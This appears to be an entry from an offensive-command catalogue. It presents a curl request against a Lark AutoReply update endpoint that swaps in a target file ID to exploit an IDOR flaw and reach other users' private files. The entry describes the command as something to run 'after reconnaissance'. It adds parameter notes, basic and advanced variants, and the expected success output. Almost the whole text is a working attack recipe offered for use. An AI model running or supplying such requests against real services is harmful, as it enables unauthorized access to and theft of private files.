---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: >-
  curl -X POST 'https://lark.example.com/api/v1/autoreply/update' -H
  'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d
  '{"response": "Auto reply with file", "file_id": "TARGET_FILE_ID_HERE"}'
tags:
  - api
  - manipulation
  - idor
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:28:28.498Z'
verified: false
validated: true
submitted: true
---
# curl-manipulate-autoreply

## Command

```bash
curl -X POST 'https://lark.example.com/api/v1/autoreply/update' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"response": "Auto reply with file", "file_id": "TARGET_FILE_ID_HERE"}'
```

## Description

This curl command manipulates the Lark AutoReply update endpoint by injecting a target file ID into the JSON payload, exploiting IDOR to access unauthorized files. Use it after reconnaissance to alter requests and trigger file retrieval.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method for updating AutoReply | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Provides the authenticated session token | Yes |
| `-H 'Content-Type: application/json'` | Sets the request body format | Yes |
| `-d '...' ` | JSON payload with manipulated file_id | Yes |
| `file_id` | Alphanumeric ID of the target private file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://lark.example.com/api/v1/autoreply/update' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"file_id": "def456"}'
```

### Advanced Usage

```bash
curl -X POST 'https://lark.example.com/api/v1/autoreply/update' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"response": "Test", "file_id": "def456", "mode": "always"}'
```

## Expected Output

Successful response: HTTP 200 with JSON confirming update and potentially including file metadata or content. Error if IDOR not exploitable: 403 Forbidden, but success yields file access without ownership check.

## Related

- [[Related Procedure: Exploit-IDOR-in-Lark-AutoReply]]
